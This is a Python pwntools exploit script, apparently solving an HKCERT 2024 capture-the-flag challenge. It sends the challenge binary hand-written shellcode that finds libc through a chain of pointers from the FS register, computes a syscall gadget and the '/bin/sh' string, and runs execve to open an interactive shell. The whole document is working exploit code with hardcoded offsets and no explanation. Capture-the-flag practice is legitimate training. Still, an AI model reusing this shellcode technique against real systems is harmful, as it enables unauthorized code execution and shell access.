#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc_chall.so.6")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("c49b-shellcode-runner3-rev.hkcert24.pwnable.hk", 1337, ssl = True)

    return r


def main():
    r = conn()

    # 0x91316  : syscall; ret;
    # 0x1d8678 : "/bin/sh" address

    shellcode = asm("""
                    /* Retrieve libc address through a chain of addresses from FS register */
                    mov r10, qword ptr fs:[0x0];
                    mov r10, qword ptr [r10 + 8];
                    mov r10, qword ptr [r10 + 0x10];
                    mov r10, qword ptr [r10];
                    sub r10, 0x21a580;

                    /* Get address of syscall gadget */
                    mov r11, 0x91316;
                    add r11, r10;

                    /* Get address of '/bin/sh' string */
                    mov rdi, 0x1d8678;
                    add rdi, r10;

                    /* Spawn that mf shell */
                    xor rsi, rsi;
                    xor rdx, rdx;
                    mov rax, 0x3b;
                    jmp r11;
                    """)
    
    assert len(shellcode) < 100

    r.sendafter(b": ", shellcode)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
